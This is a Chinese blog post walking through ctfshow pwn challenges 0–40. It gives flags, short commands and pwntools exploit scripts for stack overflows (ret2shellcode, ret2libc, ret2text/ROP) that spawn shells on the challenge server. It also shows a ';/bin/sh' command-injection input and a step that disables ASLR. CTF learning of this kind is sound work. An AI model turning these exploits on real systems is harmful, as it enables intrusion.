<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
<meta name="viewport"
      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">

    <meta name="author" content="Wi1lings">





<title>pwn入门（1~90） | Wi1lings</title>



    <link rel="icon" href="/favicon.ico">




    <!-- stylesheets list from _config.yml -->
    
    <link rel="stylesheet" href="/css/style.css">
    



    <!-- scripts list from _config.yml -->
    
    <script src="/js/script.js"></script>
    
    <script src="/js/tocbot.min.js"></script>
    



    
    
        
    


<meta name="generator" content="Hexo 7.3.0"></head>

<body>
    <script>
        // this function is used to check current theme before page loaded.
        (() => {
            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
            const isDark = currentTheme === 'dark';
            const pagebody = document.getElementsByTagName('body')[0]
            if (isDark) {
                pagebody.classList.add('dark-theme');
                // mobile
                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
            } else {
                pagebody.classList.remove('dark-theme');
                // mobile
                document.getElementById("mobile-toggle-theme").innerText = "· Light"
            }
        })();
    </script>

    <div class="wrapper">
        <header>
    <nav class="navbar">
        <div class="container">
            <div class="navbar-header header-logo"><a href="/">Wi1lings&#39;s Blog</a></div>
            <div class="menu navbar-right">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/category">Categories</a>
                
                    <a class="menu-item" href="/tag">Tags</a>
                
                    <a class="menu-item" href="/about">About</a>
                
                <input id="switch_default" type="checkbox" class="switch_default">
                <label for="switch_default" class="toggleBtn"></label>
            </div>
        </div>
    </nav>

    
    <nav class="navbar-mobile" id="nav-mobile">
        <div class="container">
            <div class="navbar-header">
                <div>
                    <a href="/">Wi1lings&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
                </div>
                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
            </div>
            <div class="menu" id="mobile-menu">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/category">Categories</a>
                
                    <a class="menu-item" href="/tag">Tags</a>
                
                    <a class="menu-item" href="/about">About</a>
                
            </div>
        </div>
    </nav>

</header>
<script>
    var mobileBtn = function f() {
        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
        var mobileMenu = document.getElementById("mobile-menu");
        if(toggleMenu.classList.contains("active")){
           toggleMenu.classList.remove("active")
            mobileMenu.classList.remove("active")
        }else{
            toggleMenu.classList.add("active")
            mobileMenu.classList.add("active")
        }
    }
</script>
            <div class="main">
                <div class="container">
    
    
        <div class="post-toc">
    <div class="tocbot-list">
    </div>
    <div class="tocbot-list-menu">
        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
        <a onclick="go_top()">Back to top</a>
        <a onclick="go_bottom()">Go to bottom</a>
    </div>
</div>

<script>
    var tocbot_timer;
    var DEPTH_MAX = 6; // 为 6 时展开所有
    var tocbot_default_config = {
        tocSelector: '.tocbot-list',
        contentSelector: '.post-content',
        headingSelector: 'h1, h2, h3, h4, h5',
        orderedList: false,
        scrollSmooth: true,
        onClick: extend_click,
    };

    function extend_click() {
        clearTimeout(tocbot_timer);
        tocbot_timer = setTimeout(function() {
            tocbot.refresh(obj_merge(tocbot_default_config, {
                hasInnerContainers: true
            }));
        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
    }

    document.ready(function() {
        tocbot.init(obj_merge(tocbot_default_config, {
            collapseDepth: 1
        }));
    });

    function expand_toc() {
        var b = document.querySelector('.tocbot-toc-expand');
        var expanded = b.getAttribute('data-expanded');
        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
        tocbot.refresh(obj_merge(tocbot_default_config, {
            collapseDepth: expanded ? 1 : DEPTH_MAX
        }));
        b.innerText = expanded ? 'Expand all' : 'Collapse all';
    }

    function go_top() {
        window.scrollTo(0, 0);
    }

    function go_bottom() {
        window.scrollTo(0, document.body.scrollHeight);
    }

    function obj_merge(target, source) {
        for (var item in source) {
            if (source.hasOwnProperty(item)) {
                target[item] = source[item];
            }
        }
        return target;
    }
</script>
    

    
    <article class="post-wrap">
        <header class="post-header">
            <h1 class="post-title">pwn入门（1~90）</h1>
            
                <div class="post-meta">
                    
                        Author: <a itemprop="author" rel="author" href="/">Wi1lings</a>
                    

                    
                        <span class="post-time">
                        Date: <a href="#">March 4, 2025&nbsp;&nbsp;19:51:45</a>
                        </span>
                    
                    
                </div>
            
        </header>

        <div class="post-content">
            <h1 id="pwn入门"><a href="#pwn入门" class="headerlink" title="pwn入门"></a>pwn入门</h1><h2 id="一、Test-your-nc"><a href="#一、Test-your-nc" class="headerlink" title="一、Test_your_nc"></a>一、Test_your_nc</h2><h3 id="pwn0"><a href="#pwn0" class="headerlink" title="pwn0"></a>pwn0</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /</span><br><span class="line">ls</span><br><span class="line">cat ctfshow_flag</span><br></pre></td></tr></table></figure>

<h3 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc即可</span><br></pre></td></tr></table></figure>

<h3 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc</span><br><span class="line">cat ctfshow_flag</span><br></pre></td></tr></table></figure>

<h3 id="pwn3"><a href="#pwn3" class="headerlink" title="pwn3"></a>pwn3</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc</span><br><span class="line">6</span><br></pre></td></tr></table></figure>

<h3 id="pwn4"><a href="#pwn4" class="headerlink" title="pwn4"></a>pwn4</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CTFshowPWN</span><br><span class="line">cat ctfshow_flag</span><br></pre></td></tr></table></figure>

<h2 id="二、前置基础"><a href="#二、前置基础" class="headerlink" title="二、前置基础"></a>二、前置基础</h2><h3 id="pwn5"><a href="#pwn5" class="headerlink" title="pwn5"></a>pwn5</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">直接运行程序即可</span><br></pre></td></tr></table></figure>

<h3 id="pwn6"><a href="#pwn6" class="headerlink" title="pwn6"></a>pwn6</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow&#123;114514&#125;</span><br></pre></td></tr></table></figure>

<h3 id="pwn7"><a href="#pwn7" class="headerlink" title="pwn7"></a>pwn7</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow&#123;0x36D&#125;</span><br></pre></td></tr></table></figure>

<h3 id="pwn8"><a href="#pwn8" class="headerlink" title="pwn8"></a>pwn8</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow&#123;0x80490eE8&#125;</span><br></pre></td></tr></table></figure>

<h3 id="pwn9"><a href="#pwn9" class="headerlink" title="pwn9"></a>pwn9</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow&#123;0x636C6557&#125;</span><br></pre></td></tr></table></figure>

<h3 id="pwn10"><a href="#pwn10" class="headerlink" title="pwn10"></a>pwn10</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow&#123;0x5F656D6F&#125;</span><br></pre></td></tr></table></figure>

<h3 id="pwn11"><a href="#pwn11" class="headerlink" title="pwn11"></a>pwn11</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow&#123;0x5F656D6F&#125;</span><br></pre></td></tr></table></figure>

<h3 id="pwn12"><a href="#pwn12" class="headerlink" title="pwn12"></a>pwn12</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow&#123;0x5F656D6F&#125;</span><br></pre></td></tr></table></figure>

<h3 id="pwn13"><a href="#pwn13" class="headerlink" title="pwn13"></a>pwn13</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc flag.c -o flag</span><br><span class="line">./flag</span><br></pre></td></tr></table></figure>

<h3 id="pwn14"><a href="#pwn14" class="headerlink" title="pwn14"></a>pwn14</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo CTFshow &gt; key</span><br><span class="line">gcc flag.c -o flag</span><br><span class="line">./flag</span><br></pre></td></tr></table></figure>

<h3 id="pwn15"><a href="#pwn15" class="headerlink" title="pwn15"></a>pwn15</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nasm -f elf64 flag.asm</span><br><span class="line">ld -s -o flag flag.o</span><br><span class="line">./flag</span><br></pre></td></tr></table></figure>

<h3 id="pwn16"><a href="#pwn16" class="headerlink" title="pwn16"></a>pwn16</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc flag.s -o flag</span><br><span class="line">./flag</span><br></pre></td></tr></table></figure>

<h3 id="pwn17"><a href="#pwn17" class="headerlink" title="pwn17"></a>pwn17</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">2</span><br><span class="line">;/bin/sh</span><br><span class="line">cat ctfshow_flag</span><br></pre></td></tr></table></figure>

<h3 id="pwn18"><a href="#pwn18" class="headerlink" title="pwn18"></a>pwn18</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">9</span><br></pre></td></tr></table></figure>

<h3 id="pwn19"><a href="#pwn19" class="headerlink" title="pwn19"></a>pwn19</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec cat /ctf* 1&gt;&amp;0</span><br></pre></td></tr></table></figure>

<h3 id="pwn20"><a href="#pwn20" class="headerlink" title="pwn20"></a>pwn20</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readelf -S pwn或者直接IDA看也可以(flag中字母小写)</span><br></pre></td></tr></table></figure>

<h3 id="pwn21"><a href="#pwn21" class="headerlink" title="pwn21"></a>pwn21</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Partial RELRO表示.got不可写而.got.plt可写</span><br></pre></td></tr></table></figure>

<h3 id="pwn22"><a href="#pwn22" class="headerlink" title="pwn22"></a>pwn22</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Full RELRO没有.got.plt</span><br></pre></td></tr></table></figure>

<h3 id="pwn23"><a href="#pwn23" class="headerlink" title="pwn23"></a>pwn23</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./pwnme + 大于58长度的字符串即可</span><br></pre></td></tr></table></figure>

<h3 id="pwn24（ret2shellcode）"><a href="#pwn24（ret2shellcode）" class="headerlink" title="pwn24（ret2shellcode）"></a>pwn24（ret2shellcode）</h3><p><img src="https://cv2bkr5mufd.feishu.cn/space/api/box/stream/download/asynccode/?code=NDdjYmNkZDE5ZGZhMjI3Yzc2N2Q0MWYxZDBkODcxOTZfM3p6a2hVakNrb084TWZXOVp4d0ZJVzNwY2dyRlY3M2VfVG9rZW46Wk5BN2JXaE41b2tuQjh4bWhxWGNnUlVqblljXzE3NDAyMjk0MjU6MTc0MDIzMzAyNV9WNA" alt="img"></p>
<blockquote>
<p>这里看出栈长度为0x10，read读入大小为0x100因此可以进行栈溢出</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = remote(&#x27;pwn.challenge.ctf.show&#x27;, 28140)</span><br><span class="line"></span><br><span class="line">offset = 0x10 + 4</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">payload = b&#x27;a&#x27; * offset + shellcode</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="pwn25（ret2libc）"><a href="#pwn25（ret2libc）" class="headerlink" title="pwn25（ret2libc）"></a>pwn25（ret2libc）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher3 import *</span><br><span class="line"></span><br><span class="line">p = remote(&#x27;pwn.challenge.ctf.show&#x27;, 28151)</span><br><span class="line">elf = ELF(&#x27;./pwn&#x27;)</span><br><span class="line"></span><br><span class="line">offset = 0x88 + 4</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[&#x27;puts&#x27;]</span><br><span class="line">puts_got = elf.got[&#x27;puts&#x27;]</span><br><span class="line">main_addr = elf.sym[&#x27;main&#x27;]</span><br><span class="line"></span><br><span class="line">payload1 = b&#x27;a&#x27; * offset + p32(puts_plt) + p32(main_addr) + p32(puts_got)</span><br><span class="line"></span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line">puts_addr = u32(p.recvuntil(&#x27;\xf7&#x27;)[-4:])</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(&#x27;puts&#x27;, puts_addr)</span><br><span class="line"></span><br><span class="line">libcbase = puts_addr - libc.dump(&#x27;puts&#x27;)</span><br><span class="line"></span><br><span class="line">sys_addr = libcbase + libc.dump(&#x27;system&#x27;)</span><br><span class="line">bin_sh_addr = libcbase + libc.dump(&#x27;str_bin_sh&#x27;)</span><br><span class="line"></span><br><span class="line">payload2 = b&#x27;a&#x27; * offset + p32(sys_addr) + p32(main_addr) + p32(bin_sh_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="pwn26"><a href="#pwn26" class="headerlink" title="pwn26"></a>pwn26</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/sys/kernel/randomize_va_space # 查看ALSR参数</span><br><span class="line"># 若不是0</span><br><span class="line">su root</span><br><span class="line">echo 0 &gt; /proc/sys/kernel/randomize_va_space</span><br><span class="line">./pwn</span><br></pre></td></tr></table></figure>

<h3 id="pwn27"><a href="#pwn27" class="headerlink" title="pwn27"></a>pwn27</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">同上</span><br></pre></td></tr></table></figure>

<h3 id="pwn28"><a href="#pwn28" class="headerlink" title="pwn28"></a>pwn28</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">同上</span><br></pre></td></tr></table></figure>

<h3 id="pwn29"><a href="#pwn29" class="headerlink" title="pwn29"></a>pwn29</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">同上</span><br></pre></td></tr></table></figure>

<h3 id="pwn30（ret2libc）"><a href="#pwn30（ret2libc）" class="headerlink" title="pwn30（ret2libc）"></a>pwn30（ret2libc）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher3 import *</span><br><span class="line"></span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line"></span><br><span class="line">p = remote(&quot;pwn.challenge.ctf.show&quot;, &quot;28299&quot;)</span><br><span class="line">elf = ELF(&quot;./pwn&quot;)</span><br><span class="line"></span><br><span class="line">offset = 0x88 + 0x4</span><br><span class="line"></span><br><span class="line">main_addr = elf.sym[&#x27;main&#x27;]</span><br><span class="line">puts_plt = elf.plt[&#x27;puts&#x27;]</span><br><span class="line">puts_got = elf.got[&#x27;puts&#x27;]</span><br><span class="line"></span><br><span class="line">payload = offset * b&#x27;a&#x27; + p32(puts_plt) + p32(main_addr) + p32(puts_got)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">puts_addr = u32(p.recvuntil(&#x27;\xf7&#x27;))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(&quot;puts&quot;,puts_addr)</span><br><span class="line">libcbase = puts_addr - libc.dump(&quot;puts&quot;)</span><br><span class="line"></span><br><span class="line">system_addr = libcbase + libc.dump(&quot;system&quot;)</span><br><span class="line">binsh_addr = libcbase + libc.dump(&quot;str_bin_sh&quot;)</span><br><span class="line"></span><br><span class="line">payload = offset * b&#x27;a&#x27; + p32(system_addr) + b&#x27;a&#x27; * 4 + p32(binsh_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="pwn31"><a href="#pwn31" class="headerlink" title="pwn31"></a>pwn31</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher3 import *</span><br><span class="line"></span><br><span class="line">context(arch=&#x27;i386&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">p = remote(&quot;pwn.challenge.ctf.show&quot;,28148)</span><br><span class="line">elf = ELF(&quot;./pwn&quot;)</span><br><span class="line"></span><br><span class="line">main_real_addr = int(p.recv().strip(),16)</span><br><span class="line"></span><br><span class="line">main_addr = elf.symbols[&#x27;main&#x27;]</span><br><span class="line">base_addr = main_real_addr - main_addr</span><br><span class="line">puts_plt = base_addr + elf.symbols[&#x27;puts&#x27;]</span><br><span class="line">puts_got = base_addr + elf.got[&#x27;puts&#x27;]</span><br><span class="line">ctfshow_addr = base_addr + elf.symbols[&#x27;ctfshow&#x27;]</span><br><span class="line">ebx = base_addr + 0x1fc0</span><br><span class="line">payload0 = b&#x27;a&#x27; * 132 + p32(ebx) + b&#x27;a&#x27; * 4 + p32(puts_plt) + p32(main_real_addr) + p32(puts_got)</span><br><span class="line">p.send(payload0)</span><br><span class="line">puts_addr = u32(p.recv(4))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(&quot;puts&quot;,puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(&#x27;puts&#x27;)</span><br><span class="line">system_addr = libc_base + libc.dump(&quot;system&quot;)</span><br><span class="line">binsh_addr = libc_base + libc.dump(&quot;str_bin_sh&quot;)</span><br><span class="line">payload = b&#x27;a&#x27; * 140 + p32(system_addr) + p32(ctfshow_addr) + p32(binsh_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="pwn32"><a href="#pwn32" class="headerlink" title="pwn32"></a>pwn32</h3><p><img src="https://sanbox-1332327456.cos.ap-guangzhou.myqcloud.com/pic/202503011907296.png"></p>
<blockquote>
<p>这里看到在程序参数大于4是会进入一个undefined()函数</p>
</blockquote>
<p><img src="https://sanbox-1332327456.cos.ap-guangzhou.myqcloud.com/pic/202503011907138.png"></p>
<blockquote>
<p>这里看到undefined()函数实际上是执行读取flag的操作，因此本题只需在运行程序时使用大于四个参数即可</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./pwnme 1 2 3 4</span><br><span class="line">2</span><br></pre></td></tr></table></figure>

<h3 id="pwn33"><a href="#pwn33" class="headerlink" title="pwn33"></a>pwn33</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">同上</span><br></pre></td></tr></table></figure>

<h3 id="pwn34"><a href="#pwn34" class="headerlink" title="pwn34"></a>pwn34</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">同上</span><br></pre></td></tr></table></figure>

<h2 id="三、栈溢出"><a href="#三、栈溢出" class="headerlink" title="三、栈溢出"></a>三、栈溢出</h2><h3 id="pwn35"><a href="#pwn35" class="headerlink" title="pwn35"></a>pwn35</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">没搞懂为什么会输出flag，但是栈溢出肯定是有的，运行程序时给一个长度大于0x6C的参数即可</span><br></pre></td></tr></table></figure>

<h3 id="pwn36（ret2text）"><a href="#pwn36（ret2text）" class="headerlink" title="pwn36（ret2text）"></a>pwn36（ret2text）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = remote(&#x27;pwn.challenge.ctf.show&#x27;, 28181)</span><br><span class="line"></span><br><span class="line">offset = 0x28 + 4</span><br><span class="line"></span><br><span class="line">get_flag = 0x8048586</span><br><span class="line"></span><br><span class="line">payload = b&#x27;a&#x27; * offset + p32(get_flag)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="pwn37（ret2text）"><a href="#pwn37（ret2text）" class="headerlink" title="pwn37（ret2text）"></a>pwn37（ret2text）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = remote(&#x27;pwn.challenge.ctf.show&#x27;, 28146)</span><br><span class="line"></span><br><span class="line">offset = 0x12 + 4</span><br><span class="line">backdoor = 0x8048521</span><br><span class="line"></span><br><span class="line">payload = b&#x27;a&#x27; * offset + p32(backdoor)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="pwn38（ret2text）"><a href="#pwn38（ret2text）" class="headerlink" title="pwn38（ret2text）"></a>pwn38（ret2text）</h3><blockquote>
<p>64位注意栈对齐</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = remote(&#x27;pwn.challenge.ctf.show&#x27;, 28251)</span><br><span class="line"></span><br><span class="line">offset = 0xA + 8</span><br><span class="line"></span><br><span class="line">backdoor = 0x400658</span><br><span class="line"></span><br><span class="line">payload = b&#x27;a&#x27; * offset + p64(backdoor)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="pwn39（ret2text）"><a href="#pwn39（ret2text）" class="headerlink" title="pwn39（ret2text）"></a>pwn39（ret2text）</h3><blockquote>
<p>system函数和&#x2F;bin&#x2F;sh不在一起时自己构造payload即可</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = remote(&#x27;pwn.challenge.ctf.show&#x27;, 28105)</span><br><span class="line"></span><br><span class="line">sys_addr = 0x80483A0</span><br><span class="line">bin_sh_addr = 0x8048750</span><br><span class="line"></span><br><span class="line">offset = 0x12 + 4</span><br><span class="line"></span><br><span class="line">payload = b&#x27;a&#x27; * offset + p32(sys_addr) + p32(0) + p32(bin_sh_addr)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="pwn40（ret2text）"><a href="#pwn40（ret2text）" class="headerlink" title="pwn40（ret2text）"></a>pwn40（ret2text）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = remote(&quot;pwn.challenge.ctf.show&quot;, &quot;28117&quot;)</span><br><span class="line"></span><br><span class="line">rdi_ret_addr = 0x4007e3</span><br><span class="line">bin_sh_addr = 0x400808</span><br><span class="line">system_addr = 0x400520</span><br><span class="line">ret_addr = 0x4004fe</span><br><span class="line"></span><br><span class="line">payload = &#x27;a&#x27; * (0xA+0x8) + p64(rdi_ret_addr) + p64(bin_sh_addr)  + p64(ret_addr) +  p64(system_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

